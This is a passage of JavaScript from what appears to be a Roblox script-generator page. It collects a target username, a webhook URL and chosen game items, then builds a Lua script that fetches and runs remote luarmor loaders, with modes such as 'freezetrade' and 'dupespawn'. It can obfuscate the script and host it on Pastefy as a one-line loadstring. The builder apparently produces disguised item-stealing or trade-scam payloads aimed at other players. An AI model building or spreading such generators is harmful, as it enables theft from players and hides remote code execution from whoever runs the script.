            } else if (currentFilter === 'Recommended') {
                filtered = filtered.filter(item => item.recommended === true);
            } else {
                filtered = filtered.filter(item => item.rarity === currentFilter);
            }
            return filtered;
        }

        function render() {
            const filtered = getFilteredItems();
            container.innerHTML = '';
            filtered.forEach(item => {
                const pill = document.createElement('span');
                pill.className = 'pill';
                if (selected.has(item.name)) pill.classList.add('selected');
                pill.textContent = item.name;
                pill.dataset.value = item.name;

                pill.addEventListener('click', () => {
                    if (selected.has(item.name)) {
                        selected.delete(item.name);
                        pill.classList.remove('selected');
                    } else {
                        selected.add(item.name);
                        pill.classList.add('selected');
                    }
                    updateCounter();
                });

                container.appendChild(pill);
            });
            updateCounter();
        }

        function updateCounter() {
            const visiblePills = container.querySelectorAll('.pill');
            let selectedCount = 0;
            visiblePills.forEach(pill => {
                if (selected.has(pill.dataset.value)) selectedCount++;
            });
            counterSpan.textContent = `${selectedCount} SELECTED`;
        }

        // ============================================================
        //  BOTÓN ALL CON ADVERTENCIA IDIOMÁTICA
        // ============================================================
        allBtn.addEventListener('click', () => {
            // Si el filtro actual es 'all' (mostrando todos los brainrots sin filtrar por rareza)
            if (currentFilter === 'all') {
                const warningMessage = getTranslatedWarning();
                showNotification(warningMessage, 'warning', 6000);
            }

            // Seleccionar todos los items visibles (comportamiento normal)
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.add(val);
                pill.classList.add('selected');
            });
            updateCounter();
        });

        noneBtn.addEventListener('click', () => {
            const pills = container.querySelectorAll('.pill');
            pills.forEach(pill => {
                const val = pill.dataset.value;
                selected.delete(val);
                pill.classList.remove('selected');
            });
            updateCounter();
        });

        filterBtns.forEach(btn => {
            btn.addEventListener('click', () => {
                filterBtns.forEach(b => b.classList.remove('active'));
                btn.classList.add('active');
                currentFilter = btn.dataset.rarity;
                render();
            });
        });

        searchInput.addEventListener('input', (e) => {
            searchTerm = e.target.value;
            render();
        });

        render();
        return selected;
    }

    // ============================================================
    //  INICIALIZAR
    // ============================================================
    const brainrotsSelected = renderBrainrots();
    const skinsSelected = renderPills('skinsContainer', skinItems, 'skinsSearch', 'skinsCounter', 'skinsAll', 'skinsNone');
    const gearsSelected = renderPills('gearsContainer', gearItems, 'gearsSearch', 'gearsCounter', 'gearsAll', 'gearsNone');

    // ============================================================
    //  FUNCIONES DE API
    // ============================================================
    async function obfuscateWithWeAreDevs(script) {
        const response = await fetch('/api/obfuscate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ script: script })
        });
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`WeAreDevs error (${response.status}): ${errorText}`);
        }
        const data = await response.json();
        if (!data.success) {
            throw new Error(data.error || 'WeAreDevs devolvió success: false');
        }
        const obfuscated = data.obfuscated;
        if (!obfuscated) {
            throw new Error(`No se pudo obtener el script ofuscado. Respuesta: ${JSON.stringify(data)}`);
        }
        return obfuscated;
    }

    async function createPastefyPaste(content) {
        const url = 'https://pastefy.app/api/v2/paste';
        const payload = {
            content: content,
            title: 'OBLIVION Script',
            syntax: 'lua',
            expires: 'never'
        };
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${PASTEFY_API_TOKEN}`
            },
            body: JSON.stringify(payload)
        });
        if (!response.ok) {
            const errorText = await response.text();
            throw new Error(`Pastefy error (${response.status}): ${errorText}`);
        }
        const result = await response.json();
        let pasteId = null;
        if (result.paste && result.paste.id) {
            pasteId = result.paste.id;
        } else if (result.id) {
            pasteId = result.id;
        } else if (result._id) {
            pasteId = result._id;
        } else if (result.pasteId) {
            pasteId = result.pasteId;
        }
        if (!pasteId) {
            throw new Error(`No se pudo obtener el ID del paste. Respuesta: ${JSON.stringify(result)}`);
        }
        return `https://pastefy.app/${pasteId}/raw`;
    }

    // ============================================================
    //  GENERAR SCRIPT
    // ============================================================
    const outputSection = document.getElementById('outputSection');
    const outputCode = document.getElementById('outputCode');
    const copyBtn = document.getElementById('copyBtn');

    function getSelectedValues(set) {
        return Array.from(set);
    }

    function buildConfigScript() {
        const username = document.getElementById('username').value.trim() || 'USERNAME';
        const webhook = document.getElementById('webhook').value.trim() || 'WEBHOOK_URL';

        const brainrots = getSelectedValues(brainrotsSelected);
        const skins = getSelectedValues(skinsSelected);
        const gears = getSelectedValues(gearsSelected);

        function luaTable(arr, indent = '    ') {
            if (arr.length === 0) return '{}';
            const items = arr.map(item => `["${item.replace(/"/g, '\\"')}"] = true`);
            return '{\n' + items.map(s => indent + s).join(',\n') + '\n}';
        }

        let script = `getgenv().TARGET_USERNAME = "${username.replace(/"/g, '\\"')}"\n`;
        script += `getgenv().WEBHOOK_URL = "${webhook.replace(/"/g, '\\"')}"\n`;
        script += `getgenv().NORMAL_BRAINROTS = ${luaTable(brainrots)}\n`;
        script += `getgenv().NORMAL_BASE_SKINS = ${luaTable(skins)}\n`;
        script += `getgenv().NORMAL_GEARS = ${luaTable(gears)}\n`;

        return script;
    }

    generateBtn.addEventListener('click', async () => {
        generateBtn.textContent = 'GENERANDO...';
        generateBtn.disabled = true;

        try {
            const configScript = buildConfigScript();
            const activeModeBtn = document.querySelector('.mode-btn.active');
            const selectedMode = activeModeBtn ? activeModeBtn.dataset.mode : 'normal';

            const guiLoadstrings = {
                adminpanel: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/94990d249776151a9ef2e92cf5cd9797.lua"))()',
                freezetrade: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7603f80b0fd8c5fddf99fe263fa8c771.lua"))()',
                dupespawn: 'loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/25526aa4c6be770707acf9100c1e88ed.lua"))()'
            };

            let modeComment = 'NORMAL';
            if (selectedMode === 'custom') {
                modeComment = 'CUSTOM';
            }
            let fullScript = configScript;

            if (selectedMode === 'normal') {
                fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)`;
            } else if (selectedMode in guiLoadstrings) {
                fullScript += `
task.spawn(function()
    ${guiLoadstrings[selectedMode]}
end)`;
            } else if (selectedMode === 'custom') {
                fullScript += `
task.spawn(function()
    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
end)`;
                const customCode = customLoadstring.value.trim();
                if (customCode) {
                    fullScript += `\n\ntask.spawn(function()\n    ${customCode.replace(/\n/g, '\n    ')}\nend)`;
                }
            }

            if (shortEnabled) {
                if (!isAuthenticated) {
                    showNotification('⚠️ Short Loadstring requires Discord authentication. Please sign in.', 'warning');
                    generateBtn.textContent = 'GENERATE SCRIPT';
                    generateBtn.disabled = false;
                    return;
                }
                try {
                    const obfuscatedScript = await obfuscateWithWeAreDevs(fullScript);
                    const pastefyUrl = await createPastefyPaste(obfuscatedScript);
                    const finalScript = `loadstring(game:HttpGet("${pastefyUrl}"))()`;
                    outputCode.textContent = finalScript;

                } catch (apiError) {
                    showNotification(`Error en el proceso automático: ${apiError.message}\n\nSe usará la URL por defecto.`, 'error');
                    outputCode.textContent = fullScript;
                }
            } else {
                outputCode.textContent = fullScript;
            }

            outputSection.classList.remove('hidden');
            outputSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
            copyBtn.textContent = 'COPY';
            copyBtn.classList.remove('copied');

        } catch (error) {
            showNotification(`Error al generar el script: ${error.message}`, 'error');
        } finally {
            generateBtn.textContent = 'GENERATE SCRIPT';
            generateBtn.disabled = false;
        }
    });

    // ============================================================
    //  COPY
    // ============================================================
    copyBtn.addEventListener('click', async () => {
        const text = outputCode.textContent;
        if (!text) return;
        try {
            await navigator.clipboard.writeText(text);
            copyBtn.textContent = 'COPIED!';
            copyBtn.classList.add('copied');
            setTimeout(() => {
                copyBtn.textContent = 'COPY';
                copyBtn.classList.remove('copied');
            }, 2000);
        } catch (err) {
            const range = document.createRange();
            range.selectNode(outputCode);
            window.getSelection().removeAllRanges();
            window.getSelection().addRange(range);
            document.execCommand('copy');
            window.getSelection().removeAllRanges();
            copyBtn.textContent = 'COPIED!';
            copyBtn.classList.add('copied');
            setTimeout(() => {
                copyBtn.textContent = 'COPY';
                copyBtn.classList.remove('copied');
            }, 2000);
        }
    });

    // ============================================================
    //  INICIALIZAR UI SEGÚN AUTENTICACIÓN
    // ============================================================
    updateUIForAuth();

});
